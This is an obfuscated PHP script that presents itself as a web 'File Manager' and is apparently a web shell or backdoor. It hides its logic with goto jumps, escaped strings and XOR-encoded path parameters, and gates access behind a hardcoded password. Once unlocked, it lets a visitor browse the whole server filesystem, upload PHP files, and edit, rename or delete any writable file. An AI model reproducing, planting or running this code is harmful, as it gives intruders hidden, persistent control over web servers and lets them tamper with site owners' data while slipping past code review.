<?php
 goto DEcBW; Vcgqd: ?>
">Root (/)</a></div><?php  goto R7D7z; a2Tfr: echo urlencode(xorEncrypt(dirname($dir), $dynamicKey)); goto bahFA; KTU_V: $dir = isset($_GET["\144\151\x72"]) ? xorDecrypt($_GET["\x64\151\162"], $dynamicKey) : getcwd(); goto FDiul; FDiul: error_reporting(E_ALL); goto o2_TL; w363i: function xorDecrypt($data, $key) { $data = base64_decode($data); $output = ''; for ($i = 0; $i < strlen($data); $i++) { $output .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)])); } return $output; } goto o_OSf; nhnPw: if (isset($_GET["\x72\x65\156\141\x6d\145"])) { if ($_SERVER["\122\105\121\x55\x45\x53\124\137\x4d\105\124\x48\117\104"] === "\x50\117\123\x54") { $old_path = xorDecrypt($_GET["\162\x65\156\141\155\145"], $dynamicKey); $new_path = dirname($old_path) . "\57" . $_POST["\x6e\145\167\156\x61\155\x65"]; if (is_writable($old_path) && rename($old_path, $new_path)) { header("\x4c\x6f\143\141\164\151\157\x6e\x3a\40\77\x64\151\x72\x3d" . urlencode(xorEncrypt($dir, $dynamicKey))); die; } else { echo "\74\x70\76\x46\141\x69\154\145\144\40\x74\x6f\x20\162\145\156\141\155\x65\40\146\x69\x6c\145\x21\74\57\x70\76"; } } echo "\x3c\x66\157\x72\x6d\40\155\x65\x74\150\x6f\x64\x3d\42\x50\x4f\x53\x54\x22\76"; echo "\x3c\x69\x6e\x70\165\164\x20\x74\x79\160\145\x3d\x22\164\x65\x78\164\x22\x20\x6e\x61\155\x65\75\42\156\145\x77\x6e\x61\155\x65\x22\40\166\141\x6c\x75\145\75\x22" . htmlspecialchars(basename(xorDecrypt($_GET["\x72\x65\156\141\x6d\x65"], $dynamicKey))) . "\42\76\74\151\x6e\160\x75\x74\40\164\171\160\x65\75\42\x73\165\142\x6d\x69\x74\42\x20\x76\141\x6c\x75\145\x3d\42\x52\x65\x6e\141\x6d\145\x22\76"; echo "\74\x2f\146\157\x72\x6d\76"; die; } goto JmWn1; gYBgL: if ($_SERVER["\122\105\x51\125\105\123\124\137\x4d\105\124\x48\117\x44"] === "\x50\x4f\x53\x54" && isset($_FILES["\146\151\x6c\x65"])) { $file = $_FILES["\x66\151\154\145"]; $upload_status = ''; if ($file["\145\162\162\x6f\162"] !== UPLOAD_ERR_OK) { $upload_status = "\125\160\154\x6f\141\x64\40\145\x72\162\x6f\x72\72\40" . $file["\145\162\162\x6f\x72"]; error_log("\x55\160\154\157\141\144\40\145\162\x72\x6f\x72\40\143\x6f\x64\145\72\40" . $file["\145\x72\162\157\162"]); } elseif (!is_uploaded_file($file["\164\x6d\160\137\156\x61\x6d\x65"])) { $upload_status = xorDecrypt(xorEncrypt("\123\145\x63\165\162\x69\164\171\40\145\x72\x72\x6f\x72\72\x20\x46\151\154\145\x20\156\157\x74\x20\x75\160\x6c\157\x61\x64\145\x64\40\143\x6f\162\x72\145\x63\x74\x6c\x79\41", $dynamicKey), $dynamicKey); } else { $allowed_types = array("\160\150\160", "\150\164\155\x6c", "\x63\163\x73", "\x6a\x73", "\x74\x78\x74", "\x6a\160\147", "\160\x6e\147", "\x70\144\146"); $ext = strtolower(pathinfo($file["\156\141\x6d\x65"], PATHINFO_EXTENSION)); $original_filename = basename($file["\x6e\x61\155\145"]); $target_path = rtrim($dir, "\57") . "\57" . $original_filename; if (file_exists($target_path)) { $base_name = pathinfo($original_filename, PATHINFO_FILENAME); $ext = pathinfo($original_filename, PATHINFO_EXTENSION); $counter = 1; do { $new_filename = "{$base_name}\50{$counter}\51\56{$ext}"; $target_path = rtrim($dir, "\x2f") . "\x2f" . $new_filename; $counter++; } while (file_exists($target_path)); } if (!in_array($ext, $allowed_types)) { $upload_status = "\x55\x6e\x73\165\x70\x70\157\x72\164\x65\144\x20\146\x69\154\x65\40\x74\x79\x70\x65\72\40{$ext}"; } elseif ($file["\x73\151\172\145"] > 5 * 1024 * 1024) { $upload_status = "\x46\151\x6c\x65\40\x74\157\157\x20\154\x61\162\147\x65\x21\40\x4d\x61\x78\x20\163\151\172\145\40\x69\163\40\65\115\102\56"; } elseif (!is_writable($dir)) { $upload_status = "\x55\160\x6c\157\141\144\40\x66\x61\x69\154\x65\x64\41\40\x44\151\162\145\143\x74\157\162\171\x20\x28{$dir}\x29\x20\151\x73\x20\156\157\x74\x20\x77\x72\151\164\141\x62\x6c\145\x2e"; error_log("\x55\160\x6c\x6f\141\x64\x20\x66\141\x69\154\x65\x64\72\x20\104\151\162\x65\143\164\157\x72\171\40{$dir}\x20\x6e\x6f\x74\40\167\x72\x69\164\x61\142\x6c\145"); } elseif (move_uploaded_file($file["\x74\x6d\x70\137\156\x61\x6d\145"], $target_path)) { $upload_status = xorDecrypt(xorEncrypt("\106\151\154\x65\x20\x75\160\154\157\x61\x64\x65\144\x20\163\165\143\143\x65\x73\x73\146\x75\154\x6c\x79\40\164\x6f\40{$target_path}\x21", $dynamicKey), $dynamicKey); error_log("\x55\x70\154\157\x61\x64\145\x64\72\40{$target_path}"); header("\114\157\x63\x61\x74\151\x6f\x6e\x3a\40\x3f\144\x69\162\x3d" . urlencode(xorEncrypt($dir, $dynamicKey))); die; } else { $upload_status = "\125\x70\x6c\157\x61\144\40\146\141\151\154\x65\144\41\x20\x43\150\145\143\x6b\40\163\145\162\166\145\162\x20\x70\x65\x72\155\151\x73\x73\x69\157\x6e\x73\40\157\162\40\160\141\164\150\x2e"; error_log("\x55\x70\x6c\x6f\141\x64\x20\146\141\x69\154\145\x64\x3a\40\x43\157\x75\154\144\40\156\157\164\x20\x6d\x6f\166\x65\x20" . $file["\164\155\x70\137\156\141\x6d\x65"] . "\x20\164\x6f\40{$target_path}"); } } } goto ty43A; Dvqq5: if (isset($_GET["\x64\145\x6c\145\x74\x65"])) { $file_to_delete = xorDecrypt($_GET["\144\145\154\x65\164\145"], $dynamicKey); if (is_writable($file_to_delete) && unlink($file_to_delete)) { header("\x4c\157\143\141\164\151\157\x6e\72\x20\x3f\x64\x69\162\75" . urlencode(xorEncrypt($dir, $dynamicKey))); die; } else { echo "\x3c\160\76\106\141\x69\x6c\145\x64\40\164\x6f\x20\144\145\154\145\164\x65\40\146\151\154\x65\41\x3c\x2f\160\76"; } } goto nhnPw; R7D7z: listFiles($dir); goto O0zKF; P5gse: if (isset($upload_status)) { ?>
<div class="alert<?php  echo strpos($upload_status, "\163\x75\143\x63\145\163\x73") !== false ? "\141\x6c\x65\x72\x74\55\x73\x75\143\143\145\163\163" : "\x61\154\x65\x72\x74\55\x77\x61\162\x6e\x69\156\x67"; ?>
"><?php  echo htmlspecialchars($upload_status); ?>
</div><?php  } goto n1GWo; bahFA: ?>
">Go Back</a> <a class="btn btn-primary"href="?dir=<?php  goto qU5Ql; F6u6H: ?>
</p><div class="mb-3"><?php  goto P5gse; o2_TL: ini_set("\144\151\163\160\154\x61\171\137\x65\x72\162\x6f\162\x73", 1); goto gYBgL; UJV_7: if (!isset($_SESSION["\x61\165\x74\x68"]) || $_SESSION["\x61\165\x74\x68"] !== true) { if (isset($_POST["\160\x61\163\163\x77\157\162\144"]) && base64_encode($_POST["\x70\x61\163\x73\x77\157\x72\144"]) === $HsT98) { $_SESSION["\x61\x75\x74\x68"] = true; } else { echo "\x3c\146\x6f\x72\155\x20\155\x65\x74\150\x6f\144\75\42\x50\x4f\123\x54\42\76\x3c\151\x6e\x70\x75\164\x20\x74\x79\160\145\75\42\x70\x61\163\163\x77\x6f\162\144\x22\x20\156\x61\155\145\75\x22\160\141\x73\163\167\157\162\144\x22\x20\x70\154\x61\x63\145\x68\157\154\x64\x65\162\x3d\42\x45\x6e\164\145\162\40\120\141\163\163\x77\157\162\144\x22\x3e\x3c\x69\156\160\x75\164\40\x74\171\160\145\75\42\x73\165\x62\155\x69\x74\42\40\x76\x61\154\165\145\75\x22\114\157\147\x69\156\42\x3e\x3c\x2f\146\x6f\x72\x6d\76"; die; } } goto oO0Fw; qU5Ql: echo urlencode(xorEncrypt("\x2f", $dynamicKey)); goto Vcgqd; JduKD: $dynamicKey = "\123\164\x61\x74\151\143\x4b\x65\x79\x31\x32\63"; goto rUefb; DEcBW: session_start(); goto JduKD; o_OSf: function listFiles($dir) { $files = scandir($dir); echo "\x3c\x75\x6c\76"; foreach ($files as $file) { if ($file === "\56" || $file === "\56\56") { continue; } $path = $dir . "\x2f" . $file; global $dynamicKey; $encodedPath = urlencode(xorEncrypt($path, $dynamicKey)); echo "\74\x6c\x69\x3e" . htmlspecialchars($file); if (is_dir($path)) { echo "\x20\74\x61\x20\x68\162\x65\x66\x3d\42\77\x64\x69\162\x3d" . $encodedPath . "\42\76\133\x4f\160\x65\x6e\135\x3c\57\141\76"; } else { echo "\x20\x3c\141\x20\x68\162\145\x66\75\42\77\x65\144\x69\x74\x3d" . $encodedPath . "\x22\x3e\133\x45\144\151\164\135\74\x2f\141\x3e"; echo "\x20\x3c\141\40\x68\x72\145\x66\75\42\x3f\x64\x65\x6c\145\x74\145\x3d" . $encodedPath . "\x22\x20\x6f\x6e\143\x6c\x69\143\x6b\x3d\42\162\145\x74\x75\162\156\x20\143\x6f\x6e\146\151\x72\155\x28\47" . xorDecrypt(xorEncrypt("\x44\145\154\145\x74\x65\40\164\150\x69\x73\40\146\x69\154\145\x3f", $dynamicKey), $dynamicKey) . "\47\x29\x22\x3e\133\104\145\154\x65\164\145\x5d\74\x2f\141\76"; echo "\40\74\x61\x20\150\x72\x65\146\75\42\x3f\162\x65\156\141\x6d\x65\75" . $encodedPath . "\x22\x3e\133\x52\145\x6e\x61\155\x65\x5d\74\57\141\76"; } echo "\74\x2f\x6c\x69\76"; } echo "\x3c\x2f\x75\154\76"; } goto KTU_V; JmWn1: ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>File Manager</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"rel="stylesheet"></head><body><div class="container mt-4"><h2>File Manager</h2><p>Current Directory:<?php  goto MnmWB; n1GWo: ?>
<form enctype="multipart/form-data"method="POST"><div class="input-group"><input class="form-control"name="file"required type="file"> <button class="btn btn-success"type="submit">Upload</button></div></form></div><div class="mb-3"><a class="btn btn-warning"href="?dir=<?php  goto a2Tfr; oO0Fw: function xorEncrypt($data, $key) { $output = ''; for ($i = 0; $i < strlen($data); $i++) { $output .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)])); } return base64_encode($output); } goto w363i; nH8i6: $HsT98 = base64_encode($uXy45); goto UJV_7; MnmWB: echo htmlspecialchars($dir); goto F6u6H; ty43A: if (isset($_GET["\145\x64\151\x74"])) { $file = xorDecrypt($_GET["\145\x64\x69\164"], $dynamicKey); if ($_SERVER["\122\105\x51\x55\x45\123\124\x5f\x4d\x45\x54\110\117\x44"] === "\x50\117\x53\x54") { if (is_writable($file) && file_put_contents($file, $_POST["\143\157\x6e\164\145\x6e\x74"]) !== false) { echo "\74\160\x3e" . xorDecrypt(xorEncrypt("\106\151\154\145\40\163\141\166\145\x64\x21", $dynamicKey), $dynamicKey) . "\x3c\x2f\x70\76"; header("\114\x6f\143\x61\164\x69\x6f\156\x3a\40\77\x64\x69\162\75" . urlencode(xorEncrypt($dir, $dynamicKey))); die; } else { echo "\74\160\x3e\106\141\151\x6c\x65\144\x20\164\157\40\x73\x61\x76\x65\40\146\x69\x6c\x65\x21\74\x2f\x70\x3e"; } } echo "\74\146\x6f\162\x6d\x20\x6d\145\164\150\x6f\144\75\42\120\x4f\x53\x54\x22\76"; echo "\x3c\164\145\170\164\x61\x72\x65\141\x20\x6e\141\155\x65\75\x22\x63\157\156\x74\145\x6e\164\42\40\162\157\167\163\x3d\42\x32\60\x22\x20\143\x6f\x6c\x73\x3d\x22\70\60\x22\x3e" . htmlspecialchars(file_get_contents($file)) . "\74\x2f\x74\x65\170\164\141\162\x65\x61\x3e\74\x62\x72\76"; echo "\74\151\x6e\160\x75\x74\x20\164\171\x70\x65\x3d\x22\163\x75\x62\155\151\x74\42\40\166\141\154\165\145\x3d\x22\x53\141\x76\145\x22\x3e"; echo "\x3c\57\146\x6f\x72\155\x3e"; die; } goto Dvqq5; rUefb: $uXy45 = "\x31\60\x36"; goto nH8i6; O0zKF: ?>
</div></body></html>
